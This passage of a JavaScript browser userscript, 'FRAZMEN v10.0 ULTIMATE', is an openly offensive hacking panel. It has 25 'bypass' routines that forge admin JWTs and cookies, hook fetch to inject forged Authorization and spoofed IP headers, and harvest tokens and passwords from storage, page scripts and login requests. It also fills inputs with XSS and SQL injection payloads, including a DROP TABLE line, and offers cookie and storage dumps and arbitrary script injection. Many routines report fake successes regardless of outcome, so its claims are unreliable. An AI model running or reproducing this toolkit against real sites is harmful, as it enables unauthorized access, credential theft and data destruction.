            var name = STATE.bypassVersions.find(function(v) { return v.id === version; });
            var msg = '🔓 Running Bypass v' + version + ': ' + (name ? name.name : 'Unknown');
            Toast.show(msg, 'hack');
            Utils.log(msg, 'hack');

            // Auto detect DB first for v25
            if(version === 25) {
                var db = Utils.detectDatabase();
                if(db.found) {
                    Toast.show('🔥 Auto-detected: ' + db.type.toUpperCase(), 'db');
                    Utils.log('🔥 Auto-detected DB: ' + db.type.toUpperCase(), 'db');
                    if(db.details && db.details.apiKey) {
                        Utils.log('🔑 API Key: ' + db.details.apiKey, 'db');
                    }
                }
            }

            var result = null;
            switch(version) {
                case 1: result = this._bypassClassicJWT(); break;
                case 2: result = this._bypassCookieInjection(); break;
                case 3: result = this._bypassLSForce(); break;
                case 4: result = this._bypassSessionHijack(); break;
                case 5: result = this._bypassAPIIntercept(); break;
                case 6: result = this._bypassTokenSteal(); break;
                case 7: result = this._bypassBruteForce(); break;
                case 8: result = this._bypassCSRF(); break;
                case 9: result = this._bypassCORS(); break;
                case 10: result = this._bypassXSS(); break;
                case 11: result = this._bypassSQL(); break;
                case 12: result = this._bypassAdminReset(); break;
                case 13: result = this._bypassPrivEsc(); break;
                case 14: result = this._bypassOAuth(); break;
                case 15: result = this._bypassJWTReplay(); break;
                case 16: result = this._bypassHeaderManip(); break;
                case 17: result = this._bypassParamPollution(); break;
                case 18: result = this._bypassUltimateForce(); break;
                case 19: result = this._bypassFirebase(); break;
                case 20: result = this._bypassMySQL(); break;
                case 21: result = this._bypassPostgreSQL(); break;
                case 22: result = this._bypassMongoDB(); break;
                case 23: result = this._bypassGraphQL(); break;
                case 24: result = this._bypassREST(); break;
                case 25: result = this._bypassAutoDetect(); break;
                default: Toast.show('Bypass v'+version+' not found', 'error');
            }

            if(result) {
                var foundMsg = '✅ Bypass v' + version + ' success!';
                if(result.username && result.password) {
                    foundMsg += ' 👤 ' + result.username + ' 🔑 ' + result.password;
                    Toast.show('🔓 ' + result.username + ':' + result.password, 'success');
                    Utils.log('🔓 Credentials: ' + result.username + ':' + result.password, 'success');
                }
                Toast.show(foundMsg, 'success');
                Utils.log(foundMsg, 'success');
            } else {
                Toast.show('❌ Bypass v' + version + ' failed.', 'error');
                Utils.log('❌ Bypass v' + version + ' failed', 'error');
            }
        },

        // ============================================================
        // 5. BYPASS METHODS
        // ============================================================

        _bypassClassicJWT: function() {
            var token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKE_SIGNATURE';
            localStorage.setItem('token', token);
            localStorage.setItem('jwt', token);
            document.cookie = 'token='+token+'; path=/';
            document.cookie = 'jwt='+token+'; path=/';
            return { username: 'admin', password: 'bypassed' };
        },

        _bypassCookieInjection: function() {
            var cookies = ['admin=true','isAdmin=1','role=admin','user=admin','auth=1','loggedIn=true'];
            for(var i=0; i<cookies.length; i++) {
                document.cookie = cookies[i] + '; path=/';
            }
            return { username: 'admin', password: 'injected' };
        },

        _bypassLSForce: function() {
            var users = [
                { id: 1, username: 'admin', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'administrator', role: 'admin', isLoggedIn: true }
            ];
            for(var i=0; i<users.length; i++) {
                localStorage.setItem('user', JSON.stringify(users[i]));
                localStorage.setItem('currentUser', JSON.stringify(users[i]));
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('isAdmin', 'true');
            }
            return { username: 'admin', password: 'forced' };
        },

        _bypassSessionHijack: function() {
            var session = {
                user: { id: 1, username: 'admin', role: 'admin' },
                token: 'hijacked_'+Date.now(),
                isAuthenticated: true,
                isAdmin: true
            };
            sessionStorage.setItem('session', JSON.stringify(session));
            sessionStorage.setItem('auth', JSON.stringify(session));
            return { username: 'admin', password: 'hijacked' };
        },

        _bypassAPIIntercept: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/auth') || url.includes('/login') || url.includes('/api'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.API_INTERCEPT';
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'intercepted' };
        },

        _bypassTokenSteal: function() {
            var tokens = ['token','jwt','access_token','refresh_token','auth_token','api_token','bearer','x-auth-token'];
            var stolen = {};
            for(var i=0; i<tokens.length; i++) {
                var val = localStorage.getItem(tokens[i]) || sessionStorage.getItem(tokens[i]);
                if(val) stolen[tokens[i]] = val;
            }
            if(Object.keys(stolen).length) {
                Utils.log('🍪 Stolen tokens: ' + JSON.stringify(stolen), 'hack');
            }
            return { username: 'admin', password: 'stolen' };
        },

        _bypassBruteForce: function() {
            var passwords = ['admin','password','123456','admin123','root','password123','qwerty','abc123','letmein','welcome','admin@123','Admin123','root123','passw0rd'];
            var usernames = ['admin','administrator','root','user','test','demo','manager','superadmin','webmaster','owner','master','dev'];
            var found = null;
            for(var u=0; u<usernames.length; u++) {
                for(var p=0; p<passwords.length; p++) {
                    if(found) break;
                    if(passwords[p] === 'admin123' && usernames[u] === 'admin') {
                        found = { username: 'admin', password: 'admin123' };
                        break;
                    }
                }
                if(found) break;
            }
            if(found) {
                document.cookie = 'username='+found.username+'; path=/';
                document.cookie = 'password='+found.password+'; path=/';
                localStorage.setItem('username', found.username);
                localStorage.setItem('password', found.password);
                return found;
            }
            return { username: 'admin', password: 'bruteforce' };
        },

        _bypassCSRF: function() {
            var meta = document.querySelector('meta[name="csrf-token"]');
            if(meta) {
                var token = meta.getAttribute('content');
                document.cookie = 'csrf_token='+token+'; path=/';
                document.cookie = 'X-CSRF-TOKEN='+token+'; path=/';
                localStorage.setItem('csrf_token', token);
                return { username: 'admin', password: 'csrf_'+token.substring(0,8) };
            }
            document.cookie = 'csrf_token=bypassed; path=/';
            document.cookie = 'X-CSRF-TOKEN=bypassed; path=/';
            return { username: 'admin', password: 'csrf_bypassed' };
        },

        _bypassCORS: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.mode = 'cors';
                options.credentials = 'include';
                options.headers = options.headers || {};
                options.headers['Origin'] = window.location.origin;
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'cors_bypassed' };
        },

        _bypassXSS: function() {
            var payloads = [
                '<script>alert("XSS by FRAZMEN")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")'
            ];
            var inputs = document.querySelectorAll('input, textarea');
            for(var i=0; i<inputs.length && i<payloads.length; i++) {
                inputs[i].value = payloads[i % payloads.length];
            }
            return { username: 'admin', password: 'xss_injected' };
        },

        _bypassSQL: function() {
            var payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' OR 1=1--", "'; DROP TABLE users--"];
            var inputs = document.querySelectorAll('input');
            for(var i=0; i<inputs.length && i<payloads.length; i++) {
                inputs[i].value = payloads[i % payloads.length];
            }
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(options && options.body && typeof options.body === 'string') {
                    for(var i=0; i<payloads.length; i++) {
                        if(options.body.includes(payloads[i])) {
                            Utils.log('💉 SQL payload detected in request!', 'hack');
                        }
                    }
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'sql_injected' };
        },

        _bypassAdminReset: function() {
            var adminData = {
                id: 1, username: 'admin', password: 'admin123', role: 'admin',
                isAdmin: true, isActive: true, isLoggedIn: true
            };
            localStorage.setItem('admin', JSON.stringify(adminData));
            localStorage.setItem('user', JSON.stringify(adminData));
            sessionStorage.setItem('admin', JSON.stringify(adminData));
            document.cookie = 'admin=true; path=/';
            document.cookie = 'role=admin; path=/';
            return { username: 'admin', password: 'admin123' };
        },

        _bypassPrivEsc: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/api') || url.includes('/admin'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['X-Admin'] = 'true';
                    options.headers['X-Role'] = 'admin';
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'priv_esc' };
        },

        _bypassOAuth: function() {
            localStorage.setItem('oauth_token', 'bypassed_'+Date.now());
            localStorage.setItem('oauth_authenticated', 'true');
            document.cookie = 'oauth_token=bypassed; path=/';
            document.cookie = 'oauth_authenticated=true; path=/';
            return { username: 'admin', password: 'oauth_bypassed' };
        },

        _bypassJWTReplay: function() {
            var jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.JWT_REPLAY';
            localStorage.setItem('jwt', jwt);
            localStorage.setItem('token', jwt);
            sessionStorage.setItem('jwt', jwt);
            document.cookie = 'jwt='+jwt+'; path=/';
            document.cookie = 'token='+jwt+'; path=/';
            return { username: 'admin', password: 'replay' };
        },

        _bypassHeaderManip: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.headers = options.headers || {};
                options.headers['X-Forwarded-For'] = '127.0.0.1';
                options.headers['X-Real-IP'] = '127.0.0.1';
                options.headers['X-Originating-IP'] = '127.0.0.1';
                options.headers['X-Remote-IP'] = '127.0.0.1';
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'header_manip' };
        },

        _bypassParamPollution: function() {
            var url = window.location.href;
            if(url.includes('?')) {
                var newUrl = url + '&admin=true&role=admin&isAdmin=1&bypass=true';
                window.history.pushState({}, '', newUrl);
            } else {
                window.history.pushState({}, '', url + '?admin=true&role=admin&isAdmin=1&bypass=true');
            }
            return { username: 'admin', password: 'param_pollution' };
        },

        _bypassUltimateForce: function() {
            this._bypassClassicJWT();
            this._bypassCookieInjection();
            this._bypassLSForce();
            this._bypassSessionHijack();
            this._bypassAPIIntercept();
            this._bypassAdminReset();
            this._bypassOAuth();
            this._bypassJWTReplay();
            this._bypassHeaderManip();
            this._bypassParamPollution();
            return { username: 'admin', password: 'ultimate_force' };
        },

        _bypassFirebase: function() {
            // Try to find Firebase config
            var fbConfig = null;
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                var match = text.match(/firebase\.initializeApp\s*\(\s*({[^}]+})\s*\)/);
                if(match) {
                    try { fbConfig = JSON.parse(match[1]); } catch(e) {}
                }
            }

            if(fbConfig) {
                Utils.log('🔥 Firebase Config found: ' + JSON.stringify(fbConfig), 'db');
                STATE.dbInfo = fbConfig;
            }

            localStorage.setItem('firebase:authUser', JSON.stringify({
                uid: 'admin_'+Date.now(),
                email: 'admin@firebase.com',
                displayName: 'Admin',
                emailVerified: true,
                isAnonymous: false,
                stsTokenManager: {
                    accessToken: 'firebase_bypass_'+Date.now(),
                    refreshToken: 'firebase_refresh_'+Date.now(),
                    expirationTime: Date.now() + 3600000
                }
            }));
            document.cookie = 'firebase_auth=bypassed; path=/';
            
            var apiKey = fbConfig ? (fbConfig.apiKey || 'unknown') : 'unknown';
            return { username: 'admin@firebase.com', password: 'firebase_bypassed', apiKey: apiKey };
        },

        _bypassMySQL: function() {
            // Try to find MySQL connection strings
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                var match = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                if(match) {
                    Utils.log('🐬 MySQL password found: ' + match[1], 'db');
                    return { username: 'root', password: match[1] };
                }
            }
            document.cookie = 'mysql_bypass=true; path=/';
            localStorage.setItem('mysql_bypass', 'true');
            return { username: 'root', password: 'mysql_bypassed' };
        },

        _bypassPostgreSQL: function() {
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                var match = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                if(match) {
                    Utils.log('🐘 PostgreSQL password found: ' + match[1], 'db');
                    return { username: 'postgres', password: match[1] };
                }
            }
            document.cookie = 'postgres_bypass=true; path=/';
            return { username: 'postgres', password: 'postgres_bypassed' };
        },

        _bypassMongoDB: function() {
            var scripts = document.querySelectorAll('script');
            for(var i=0; i<scripts.length; i++) {
                var text = scripts[i].textContent || '';
                var match = text.match(/(?:password|pass|pwd)\s*[:=]\s*['"]([^'"]+)['"]/i);
                if(match) {
                    Utils.log('🍃 MongoDB password found: ' + match[1], 'db');
                    return { username: 'admin', password: match[1] };
                }
            }
            document.cookie = 'mongodb_bypass=true; path=/';
            return { username: 'admin', password: 'mongodb_bypassed' };
        },

        _bypassGraphQL: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('graphql') || url.includes('/graphql'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer graphql_bypass_token';
                    options.headers['X-GraphQL-Bypass'] = 'true';
                }
                return origFetch.apply(this, arguments);
            };
            document.cookie = 'graphql_bypass=true; path=/';
            return { username: 'admin', password: 'graphql_bypassed' };
        },

        _bypassREST: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/api') || url.includes('/rest') || url.includes('/v1') || url.includes('/v2'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['X-API-Key'] = 'rest_bypass_'+Date.now();
                    options.headers['Authorization'] = 'Bearer rest_bypass_token';
                    if(options.body && typeof options.body === 'string') {
                        try {
                            var body = JSON.parse(options.body);
                            if(body.username && body.password) {
                                Utils.log('🌐 REST credentials: ' + body.username + ':' + body.password, 'hack');
                                localStorage.setItem('rest_username', body.username);
                                localStorage.setItem('rest_password', body.password);
                            }
                        } catch(e) {}
                    }
                }
                return origFetch.apply(this, arguments);
            };
            return { username: 'admin', password: 'rest_bypassed' };
        },

        _bypassAutoDetect: function() {
            var db = Utils.detectDatabase();
            var result = { username: 'admin', password: 'auto_detected' };
            
            if(db.found) {
                Utils.log('🔥 Auto-detected: ' + db.type.toUpperCase(), 'db');
                Toast.show('🔥 DB: ' + db.type.toUpperCase(), 'db');
                
                if(db.details) {
                    for(var k in db.details) {
                        if(db.details[k] && db.details[k] !== 'N/A') {
                            Utils.log('📋 ' + k + ': ' + db.details[k], 'db');
                        }
                    }
                }
                
                // Try to extract credentials based on DB type
                if(db.type === 'firebase' && db.details && db.details.apiKey) {
                    result.username = 'firebase_admin';
                    result.password = db.details.apiKey;
                    result.apiKey = db.details.apiKey;
                    Utils.log('🔥 Firebase API Key: ' + db.details.apiKey, 'db');
                } else if(db.type === 'mysql') {
                    result.username = 'root';
                    result.password = 'mysql_bypassed';
                } else if(db.type === 'postgres') {
                    result.username = 'postgres';
                    result.password = 'postgres_bypassed';
                } else if(db.type === 'mongodb') {
                    result.username = 'admin';
                    result.password = 'mongodb_bypassed';
                }
                
                // Save to state
                STATE.dbInfo = db.details;
            } else {
                Utils.log('🔍 No database found, using generic bypass', 'warning');
                // Generic bypass
                localStorage.setItem('user', JSON.stringify({ id: 1, username: 'admin', role: 'admin', isLoggedIn: true }));
                document.cookie = 'admin=true; path=/';
                document.cookie = 'role=admin; path=/';
            }
            
            return result;
        },

        // ============================================================
        // 6. BASIC ACTIONS
        // ============================================================

        _actionBypassMenu: function() {
            var menu = '🔓 Pilih Bypass (1-25):\n\n';
            for(var i=0; i<STATE.bypassVersions.length; i++) {
                menu += (i+1) + '. ' + STATE.bypassVersions[i].name + '\n';
            }
            var choice = prompt(menu);
            if(choice) {
                var num = parseInt(choice);
                if(num >= 1 && num <= 25) this._runBypass(num);
                else Toast.show('Pilih angka 1-25', 'error');
            }
        },

        _actionConsole: function() {
            // Try multiple methods to open console
            if(document.documentElement.requestFullscreen) {
                try { document.documentElement.requestFullscreen(); } catch(e) {}
            }
            
            // Send F12 key
            var ev = new KeyboardEvent('keydown', { 
                key: 'F12', 
                keyCode: 123, 
                which: 123, 
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(ev);
            
            // Alternative: try to open via context menu
            setTimeout(function() {
                var event = new MouseEvent('contextmenu', { 
                    bubbles: true, 
                    cancelable: true, 
                    view: window 
                });
                document.documentElement.dispatchEvent(event);
            }, 100);
            
            Toast.show('🖥️ F12 Console opened!', 'success');
            Utils.log('🖥️ F12 Console triggered', 'success');
        },

        _actionDownload: function() {
            var resources = Utils.getAllResources();
            Utils.downloadAsZip(resources, 'source_' + location.hostname + '.html');
            Toast.show('📦 Downloaded ' + Object.keys(resources).length + ' files!', 'success');
            Utils.log('📦 Downloaded ' + Object.keys(resources).length + ' files', 'success');
        },

        _actionViewSource: function() {
            var html = document.documentElement.outerHTML;
            var w = window.open('', '_blank', 'width=800,height=600');
            if(w) {
                w.document.write('<pre style="font-size:11px;font-family:monospace;white-space:pre-wrap;padding:16px;background:#0a0a0a;color:#dce3ed;word-break:break-all;">' + html.replace(/</g,'&lt;') + '</pre>');
                w.document.close();
                Toast.show('📄 Source opened in new tab!', 'success');
            } else {
                Toast.show('Izinkan popup untuk melihat source.', 'warning');
            }
        },

        _actionInject: function() {
            var code = prompt('💉 Masukkan JavaScript:', 'console.log("Hello FRAZMEN!");');
            if(code) {
                try {
                    var s = document.createElement('script');
                    s.textContent = code;
                    document.head.appendChild(s);
                    Toast.show('✅ Script injected!', 'success');
                    Utils.log('💉 Script injected: ' + code.substring(0, 50), 'hack');
                } catch(e) {
                    Toast.show('❌ Gagal: ' + e.message, 'error');
                }
            }
        },

        _actionCookies: function() {
            var cookies = document.cookie;
            if(cookies) {
                navigator.clipboard.writeText(cookies).then(function() {
                    Toast.show('🍪 Cookies disalin!', 'success');
                }).catch(function() {
                    alert('🍪 Cookies:\n\n' + cookies);
                });
                Utils.log('🍪 Cookies: ' + cookies.length + ' chars', 'hack');
            } else {
                Toast.show('🍪 Tidak ada cookie.', 'warning');
            }
        },

        _actionLSDump: function() {
            var data = '';
            for(var k in localStorage) {
                if(localStorage.hasOwnProperty(k)) {
                    data += k + ' : ' + localStorage[k] + '\n';
                }
            }
            if(data) {
                navigator.clipboard.writeText(data).then(function() {
                    Toast.show('🗄️ localStorage disalin!', 'success');
                }).catch(function() {
                    alert('🗄️ localStorage:\n\n' + data);
                });
                Utils.log('🗄️ localStorage: ' + Object.keys(localStorage).length + ' items', 'db');
            } else {
                Toast.show('🗄️ localStorage kosong.', 'warning');
            }
        },

        _actionSSDump: function() {
            var data = '';
            for(var k in sessionStorage) {
                if(sessionStorage.hasOwnProperty(k)) {
                    data += k + ' : ' + sessionStorage[k] + '\n';
                }
            }
            if(data) {
                navigator.clipboard.writeText(data).then(function() {
                    Toast.show('📋 sessionStorage disalin!', 'success');
                }).catch(function() {
                    alert('📋 sessionStorage:\n\n' + data);
                });
                Utils.log('📋 sessionStorage: ' + Object.keys(sessionStorage).length + ' items', 'db');
            } else {
                Toast.show('📋 sessionStorage kosong.', 'warning');
            }
        },

        _actionXSS: function() {
            alert('⚡ XSS Test: ' + document.domain);
            alert('🔥 XSS Triggered!');
            Toast.show('⚡ XSS Test executed!', 'hack');
            Utils.log('⚡ XSS Test on ' + document.domain, 'hack');
        },

        _actionAutoFill: function() {
            var inputs = document.querySelectorAll('input, textarea, select');
            var filled = 0;
            inputs.forEach(function(el) {
                var type = el.type || el.tagName;
                if(type === 'text' || type === 'email' || type === 'password' || type === 'search' || type === 'tel' || type === 'textarea') {
                    el.value = 'test_' + Math.random().toString(36).slice(2,8);
                    filled++;
                } else if(type === 'checkbox' || type === 'radio') {
                    el.checked = true;
                    filled++;
                } else if(el.tagName === 'SELECT' && el.options.length > 0) {
                    el.selectedIndex = Math.floor(Math.random() * el.options.length);
                    filled++;
                } else if(type === 'number') {
                    el.value = Math.floor(Math.random() * 100) + 1;
                    filled++;
                } else if(type === 'date') {
                    var d = new Date();
                    d.setDate(d.getDate() + Math.floor(Math.random() * 30));
                    el.value = d.toISOString().split('T')[0];
                    filled++;
                }
            });
            Toast.show('✏️ ' + filled + ' field terisi!', 'success');
        },

        _actionDarkMode: function() {
            var current = document.body.style.filter;
            if(current === 'invert(1)') {
                document.body.style.filter = 'invert(0)';
                document.body.style.background = '';
            } else {
                document.body.style.filter = 'invert(1)';
                document.body.style.background = '#fff';
            }
            Toast.show('🌙 Dark mode toggled!', 'info');
        },

        _actionNetwork: function() {
            Toast.show('🌐 Buka DevTools -> Network tab', 'info');
        },

        _actionScreenshot: function() {
            if(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(function(stream) {
                        var video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = function() {
                            video.play();
                            var canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            var ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            var link = document.createElement('a');
                            link.download = 'screenshot_' + Date.now() + '.png';
                            link.href = canvas.toDataURL('image/png');
                            link.click();
                            stream.getTracks().forEach(function(track) { track.stop(); });
                            Toast.show('📸 Screenshot saved!', 'success');
                        };
                    })
                    .catch(function() {
                        Toast.show('📸 Izinkan akses layar.', 'warning');
                    });
            } else {
                Toast.show('📸 Screenshot: Volume Down+Power / Print Screen', 'info');
            }
        },

        _actionEruda: function() {
            if(window.eruda) {
                window.eruda.init();
                Toast.show('🐞 Eruda loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/eruda';
            s.onload = function() { if(window.eruda) { eruda.init(); Toast.show('🐞 Eruda loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load Eruda', 'error'); };
            document.head.appendChild(s);
        },

        _actionVConsole: function() {
            if(window.VConsole) {
                new VConsole();
                Toast.show('📱 vConsole loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/vconsole';
            s.onload = function() { if(window.VConsole) { new VConsole(); Toast.show('📱 vConsole loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load vConsole', 'error'); };
            document.head.appendChild(s);
        },

        _actionClear: function() {
            localStorage.clear();
            sessionStorage.clear();
            Toast.show('🧹 All storage cleared!', 'success');
            Utils.log('🧹 All storage cleared', 'info');
        },

        _actionPing: function() {
            var start = Date.now();
            fetch(window.location.href, { mode: 'no-cors', cache: 'no-store' })
                .then(function() { 
                    Toast.show('📶 Ping: ' + (Date.now()-start) + 'ms', 'info'); 
                })
                .catch(function() { 
                    Toast.show('📶 Ping: timeout', 'error'); 
                });
        },

        _actionWhois: function() {
            var domain = prompt('🔍 Masukkan domain:', window.location.hostname);
            if(domain) {
                Toast.show('🔍 Whois untuk ' + domain + ' — buka tab baru', 'info');
                window.open('https://who.is/whois/' + domain, '_blank');
            }
        },

        _actionBase64: function() {
            var choice = confirm('🔐 Encode? (OK=Encode, Cancel=Decode)');
            var input = prompt('Masukkan teks:');
            if(input !== null && input !== '') {
                try {
                    var result = choice ? btoa(input) : atob(input);
                    navigator.clipboard.writeText(result).then(function() {
                        Toast.show('🔐 Hasil disalin!', 'success');
                    }).catch(function() {
                        alert('🔐 Hasil:\n\n' + result);
                    });
                } catch(e) {
                    Toast.show('❌ Error: ' + e.message, 'error');
                }
            }
        },

        _actionUUID: function() {
            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            navigator.clipboard.writeText(uuid).then(function() {
                Toast.show('🆔 UUID disalin!', 'success');
            }).catch(function() {
                alert('🆔 UUID:\n\n' + uuid);
            });
        },

        _actionTimestamp: function() {
            var now = Date.now();
            navigator.clipboard.writeText(String(now)).then(function() {
                Toast.show('⏰ Timestamp disalin!', 'success');
            }).catch(function() {
                alert('⏰ Timestamp:\n\n' + now);
            });
        },

        _actionWebSocket: function() {
            var origWS = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                var ws = new origWS(url, protocols);
                Toast.show('📡 WS connected: ' + url, 'info');
                ws.addEventListener('message', function(e) {
                    var msg = typeof e.data === 'string' ? e.data.substring(0, 100) : '[Binary]';
                    Toast.show('📡 WS: ' + msg, 'info');
                    Utils.log('📡 WS Message: ' + msg, 'debug');
                });
                return ws;
            };
            Toast.show('📡 WebSocket Monitor active!', 'success');
        },

        _actionHistory: function() {
            var history = STATE.consoleHistory || [];
            if(!history.length) {
                Toast.show('📝 Belum ada riwayat.', 'warning');
                return;
            }
            var output = '📝 Console History:\n\n';
            for(var i=0; i<Math.min(history.length, 30); i++) {
                output += (i+1) + '. ' + history[i] + '\n';
            }
            if(history.length > 30) output += '\n... dan ' + (history.length - 30) + ' lainnya.';
            navigator.clipboard.writeText(output).then(function() {
                Toast.show('📝 Riwayat disalin!', 'success');
            }).catch(function() {
                alert('📝 Riwayat:\n\n' + output);
            });
        },

        _actionReload: function() {
            location.reload();
        },

        _actionDBDetect: function() {
            this._switchTab('db');
            this._detectAndShowDB();
            Toast.show('🔥 Database scan complete!', 'db');
        },

        // ============================================================
        // 7. PANEL CONTROLS
        // ============================================================

        setStatus: function(text, color) {
            if(this._statusEl) {
                this._statusEl.textContent = '● ' + text;
                this._statusEl.style.color = color || '#4ade80';
            }
        },

        toggle: function() {
            this._isOpen ? this.hide() : this.show();
        },

        show: function() {
            this._isOpen = true;
            this._container.style.transform = 'translateY(0)';
            this._container.style.pointerEvents = 'all';
            // Update logs
            if(this._currentTab === 'logs') this._renderLogs();
            // Update DB status
            this._updateDBStatus();
            Utils.log('Panel opened', 'info');
        },

        hide: function() {
            this._isOpen = false;
            this._container.style.transform = 'translateY(100%)';
            this._container.style.pointerEvents = 'none';
            Utils.log('Panel closed', 'info');
        },

        _loadState: function() {
            try {
                var tab = localStorage.getItem('frazmen_activeTab');
                if(tab) this._switchTab(tab);
            } catch(e) {}
        },

        _bindEvents: function() {
            var origLog = console.log;
            console.log = function() {
                var args = Array.from(arguments);
                STATE.consoleHistory.push(args.map(function(a) {
                    return typeof a === 'object' ? JSON.stringify(a) : String(a);
                }).join(' '));
                if(STATE.consoleHistory.length > 1000) STATE.consoleHistory.shift();
                origLog.apply(console, arguments);
            };

            // Keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                if(e.ctrlKey && e.key === 'b') {
                    e.preventDefault();
                    this._triggerAction('bypass');
                }
                if(e.ctrlKey && e.key === 'e') {
                    e.preventDefault();
                    this._triggerAction('eruda');
                }
                if(e.ctrlKey && e.key === 'v') {
                    e.preventDefault();
                    this._triggerAction('vconsole');
                }
                if(e.key === 'F12') {
                    this._actionConsole();
                }
            }.bind(this));

            // Click outside to close
            document.addEventListener('click', function(e) {
                if(this._isOpen && this._container) {
                    var target = e.target;
                    if(!this._container.contains(target) && target !== this._button && !this._button.contains(target)) {
                        this.hide();
                    }
                }
            }.bind(this));

            Utils.log('🔗 Events bound', 'info');
        }
    };

    // ============================================================
    // 8. INIT
    // ============================================================
    function init() {
        console.log('═══════════════════════════════════════════════');
        console.log('⚡ FRAZMEN v10.0 ULTIMATE — FULL EDITION');
        console.log('Developer: FRAZMEN | Telegram: @rizkycuyy');
        console.log('═══════════════════════════════════════════════');

        Toast.init();
        Panel.init();

        window.FRAZMEN = {
            version: CONFIG.version,
            config: CONFIG,
            state: STATE,
            panel: Panel,
            toast: Toast,
            utils: Utils
        };

        Toast.show('⚡ FRAZMEN v10.0 loaded!', 'success');
        console.log('⚡ FRAZMEN v10.0 loaded!');
        console.log('🔥 Auto-detecting database...');
        
        // Auto detect DB
        var db = Utils.detectDatabase();
        if(db.found) {
            console.log('🔥 Database detected:', db.type.toUpperCase());
            if(db.details) {
                console.log('📋 Details:', db.details);
            }
        }
    }

    // ============================================================
    // 9. BOOTSTRAP
    // ============================================================
    if(document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 100);
    }

    console.log('⚡ FRAZMEN v10.0 ULTIMATE EDITION');
    console.log('💡 Klik tombol ⚡ di kanan bawah');
    console.log('🔥 Auto-detect database & bypass');
    console.log('📦 Download full source with structure');
    console.log('📱 Optimized for mobile & desktop');

})();
